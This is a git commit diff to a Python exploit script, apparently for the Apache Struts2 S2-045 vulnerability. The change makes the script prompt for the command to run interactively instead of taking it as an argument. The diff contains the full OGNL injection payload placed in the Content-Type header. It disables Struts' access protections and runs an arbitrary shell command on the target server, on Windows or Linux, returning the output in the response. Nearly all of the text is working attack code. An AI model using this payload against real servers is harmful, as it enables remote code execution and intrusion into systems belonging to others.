c0c9b6c420caebe9dbbe01ac29e8bf7c0d978d78
S4kur4 <2570160655@qq.ccom>
2017-03-10 14:35:09 +0800

    some changes
    some changes and bugs fixed.

--- exps/S2-045.py
+++ exps/S2-045.py
@@ -22,16 +22,14 @@ def main():
     datagen, header2 = multipart_encode({"image1": open("tmp.txt", "rb")})
     parser = optparse.OptionParser('usage: %prog [options]')
     parser.add_option('-u', '--url', dest='target_url', type='string', help='specify target URL')
-    parser.add_option('-c', '--command', dest='command', type='string', help='specify command you execute')
     (options, args) = parser.parse_args()
-    if (options.target_url==None) | (options.command==None):
+    if options.target_url==None:
         parser.print_help()
         sys.exit(0)
     else:
         target_url = options.target_url
-        command = options.command
     target_url = target_url.rstrip('/')
-
+    command = raw_input("input command:")
     header1["Content-Type"] = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
     header1["Content-Length"] = header2["Content-Length"]
     request = urllib2.Request(target_url,datagen,headers=header1)
